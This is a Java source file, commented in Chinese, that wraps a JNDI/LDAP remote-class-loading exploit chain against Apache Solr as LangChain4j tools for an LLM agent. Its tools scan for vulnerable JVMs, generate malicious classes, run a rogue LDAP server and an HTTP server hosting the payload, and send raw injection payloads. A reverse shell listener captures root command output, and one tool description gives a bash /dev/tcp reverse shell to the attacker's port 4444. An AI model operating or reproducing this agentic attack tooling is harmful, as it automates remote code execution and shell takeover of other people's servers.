package agent;

import com.sun.net.httpserver.HttpServer;
import dev.langchain4j.agent.tool.Tool;
import toolkit.EndpointScanner;
import toolkit.HttpFileServer;
import toolkit.MaliciousClassGenerator;
import toolkit.MaliciousLDAPServer;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 攻击工具注册层：把 java_toolkit 的执行层包装成 LLM 可调用的工具函数
 *
 * 每个 @Tool 方法 = 一个"行动原语"，返回值 = LLM 的"观察结果"。
 * 方法名、描述、参数名会被 LangChain4j 转换成 function calling 的JSON Schema 发给 LLM，所以描述要写"给 LLM 看的话"：用途、典型参数、返回值的含义、什么现象代表什么结论。
 *
 * 状态是在工具间共享的， LLM 可以通过 getCallbackStats 调用观察整个攻击链的情况
 */
public class AttackTools {

    /** 约定端口：LDAP 1389 / HTTP 8888 / 反弹 shell 4444 */
    public static final int DEFAULT_LDAP_PORT = 1389;
    public static final int DEFAULT_HTTP_PORT = 8888;
    public static final int DEFAULT_SHELL_PORT = 4444;

    private static AgentConfig cfg = new AgentConfig();

    public static void configure(AgentConfig c) {
        cfg = c;
    }

    public static AgentConfig cfg() {
        return cfg;
    }

    private static ServerSocket ldapHandle;
    private static HttpServer httpHandle;
    private static volatile ShellSession shell;

    /** 反弹 shell 会话：后台线程捕获目标输出，供 LLM 读取验证 */
    public static class ShellSession {
        final int port;
        final ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        volatile boolean connected = false;
        volatile boolean done = false;
        volatile String error;

        ShellSession(int port) {
            this.port = port;
        }

        public synchronized String output() {
            return buffer.toString(StandardCharsets.UTF_8);
        }
    }

    // 观察类工具

    @Tool("扫描目标端口是否开放，并请求 Solr 管理接口读取 JVM 版本，返回端口状态、Solr core 列表与漏洞结论（JDK 1.8.0_191 之前才允许 LDAP 远程 codebase 加载）")
    public String scanEndpoint(String host, int port, int timeoutMs) {
        StringBuilder sb = new StringBuilder();
        if (!EndpointScanner.checkPort(host, port, timeoutMs)) {
            return "port " + port + " on " + host + " is CLOSED or filtered";
        }
        sb.append("port open. ");
        String cores = EndpointScanner.httpGet(host, port, "/solr/admin/cores", timeoutMs);
        Matcher m = Pattern.compile("\"name\"\\s*:\\s*\"([^\"]+)\"").matcher(cores);
        sb.append("cores: ");
        int n = 0;
        while (m.find()) {
            if (n++ > 0) sb.append(",");
            sb.append(m.group(1));
        }
        sb.append(". ");
        String sys = EndpointScanner.httpGet(host, port, "/solr/admin/info/system", timeoutMs);
        Matcher jvm = Pattern.compile("1\\.8\\.0_(\\d+)").matcher(sys);
        if (jvm.find()) {
            int update = Integer.parseInt(jvm.group(1));
            sb.append("JVM=1.8.0_").append(update).append(" -> ");
            sb.append(update < 191 ? "VULNERABLE（LDAP 远程类加载可用）"
                                   : "已修复（8u191+ 默认禁止远程 codebase，LDAP 链无效）");
        } else {
            sb.append("JVM 版本未识别（非 Java 8 或接口无响应）");
        }
        return sb.toString();
    }

    @Tool("查询当前回调统计：LDAP 收到多少次 SearchRequest、HTTP 收到多少次类下载、反弹 shell 是否已连回、已捕获的 shell 输出。这是判断 payload 是否命中的核心观察工具")
    public String getCallbackStats() {
        StringBuilder sb = new StringBuilder();
        sb.append("ldapSearchHits=").append(MaliciousLDAPServer.getSearchHits());
        sb.append(" httpClassDownloads=").append(HttpFileServer.getHttpHits());
        if (shell != null) {
            sb.append(" shellConnected=").append(shell.connected);
            sb.append(" shellDone=").append(shell.done);
            String out = shell.output().trim();
            if (!out.isEmpty()) {
                sb.append(" shellOutput=[").append(out).append(']');
            }
            if (shell.error != null) {
                sb.append(" shellError=").append(shell.error);
            }
        } else {
            sb.append(" shellListener=not-started");
        }
        return sb.toString();
    }

    @Tool("读取反弹 shell 已捕获的全部输出，用于验证目标机命令执行结果。shell 输出中出现 uid=0(root) 即证明命令执行成功")
    public String readShellOutput() {
        if (shell == null) {
            return "shell listener not started yet";
        }
        if (!shell.connected) {
            return "no connection yet" + (shell.error != null ? "; error=" + shell.error : "");
        }
        String out = shell.output().trim();
        return out.isEmpty() ? "(connected, no output captured yet)" : out;
    }

    // 行动类工具 

    @Tool("生成恶意类：在目标机上以 root 执行指定命令。典型命令是反弹 shell：bash -i >& /dev/tcp/攻击机IP/4444 0>&1。产物为 Java 8 字节码，供 JNDI Reference 远程加载")
    public String generateExploitClass(String command) {
        try {
            var f = MaliciousClassGenerator.generate(command, "exploit_dir");
            return "generated " + f.getAbsolutePath() + " (" + f.length() + " bytes, Java 8)";
        } catch (Exception e) {
            return "generate failed: " + e;
        }
    }

    @Tool("启动恶意 LDAP 服务器：对任何 SearchRequest 返回 javaNamingReference 条目，引导目标从攻击机 HTTP codebase 下载恶意类。返回监听地址")
    public String startLdapServer(int port) {
        try {
            String codebase = "http://" + cfg.attackerIp + ":" + DEFAULT_HTTP_PORT + "/";
            ldapHandle = MaliciousLDAPServer.start(port, codebase, "Exploit");
            return "LDAP listening on 0.0.0.0:" + port + " codeBase=" + codebase;
        } catch (IOException e) {
            return "LDAP start failed: " + e;
        }
    }

    @Tool("启动 HTTP 文件服务器，托管 exploit_dir 目录下的恶意类，供目标 JVM 下载。返回监听地址")
    public String startHttpServer(int port) {
        try {
            httpHandle = HttpFileServer.start("exploit_dir", port);
            return "HTTP serving exploit_dir on 0.0.0.0:" + port;
        } catch (IOException e) {
            return "HTTP start failed: " + e;
        }
    }

    @Tool("启动反弹 shell 监听器并等待目标连回（最多 waitMs 毫秒），连回后自动发送 id; hostname; whoami 探测并捕获输出。返回连接结果")
    public String startShellListener(int port, int waitMs) {
        if (shell != null && !shell.done) {
            return "listener already running on " + shell.port;
        }
        shell = new ShellSession(port);
        Thread t = new Thread(() -> {
            try (ServerSocket ss = new ServerSocket(port)) {
                ss.setSoTimeout(waitMs);
                Socket c = ss.accept();
                shell.connected = true;
                c.setSoTimeout(5000);
                try (InputStream in = c.getInputStream(); OutputStream out = c.getOutputStream()) {
                    out.write("id; hostname; whoami; cat /etc/hostname\n".getBytes());
                    out.flush();
                    byte[] buf = new byte[4096];
                    long deadline = System.currentTimeMillis() + 8000;
                    while (System.currentTimeMillis() < deadline) {
                        try {
                            int n = in.read(buf);
                            if (n < 0) break;
                            synchronized (shell.buffer) {
                                shell.buffer.write(buf, 0, n);
                            }
                            if (shell.output().contains("#")) break;  // 命令回显完成
                        } catch (SocketTimeoutException e) {
                            break;
                        }
                    }
                    out.write("exit\n".getBytes());
                    out.flush();
                }
            } catch (IOException e) {
                shell.error = e.toString();
            } finally {
                shell.done = true;
            }
        });
        t.setDaemon(true);
        t.start();
        return "shell listener started on 0.0.0.0:" + port + ", waiting " + waitMs + "ms";
    }

    @Tool("发送任意原始 payload 字符串到目标（path 会被拼上 ?action= 后原样发送，不做 URL 编码）。返回 HTTP 状态行。400 是正常现象：参数已先写入日志并触发 lookup")
    public String sendRawPayload(String host, int port, String path, String payload, int timeoutMs) {
        String full = path + "?action=" + payload;
        String resp = EndpointScanner.httpGet(host, port, full, timeoutMs);
        String status = resp.startsWith("HTTP/") ? resp.substring(0, resp.indexOf("\r\n")) : resp;
        return "status=" + status + "  sent=" + full;
    }

    //单条请求的发送原语
    public static String sendRaw(String host, int port, String path, String payload, int timeoutMs) {
        String full = path + "?action=" + payload;
        String resp = EndpointScanner.httpGet(host, port, full, timeoutMs);
        String status = resp.startsWith("HTTP/") ? resp.substring(0, resp.indexOf("\r\n")) : resp;
        return "status=" + status + "  sent=" + full;
    }
}
